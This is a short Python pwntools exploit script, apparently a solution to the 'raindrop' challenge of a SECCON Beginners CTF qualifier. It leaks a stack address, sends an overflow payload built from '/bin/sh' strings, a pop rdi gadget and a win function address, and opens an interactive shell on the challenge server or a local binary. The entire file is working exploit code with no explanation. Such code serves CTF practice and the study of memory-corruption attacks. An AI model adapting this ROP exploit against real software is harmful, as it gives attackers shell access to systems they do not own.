from pwn import *

sendlineafter = lambda p, x, y: p.sendlineafter(x, y)
sendline = lambda p, x: p.sendline(x)
send = lambda p, x: p.send(x)

filepath = './chall'
e = context.binary = ELF(filepath, checksec=False)
if args.REMOTE:
    p = remote('raindrop.quals.beginners.seccon.jp', 9001)
else:
    p = process(filepath)
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    one_gadget = [0xe3b2e, 0xe3b31, 0xe3b34]

pop_rdi = 0x401453
win = 0x4011e5

p.recvuntil(b'000002 | ')
buf = int(p.recvuntil(b' '), 16) - 0x20
log.info(hex(buf))
payload = b'/bin/sh\0'*3
payload += p64(pop_rdi)
payload += p64(buf)
payload += p64(win)
send(p, payload)

p.interactive()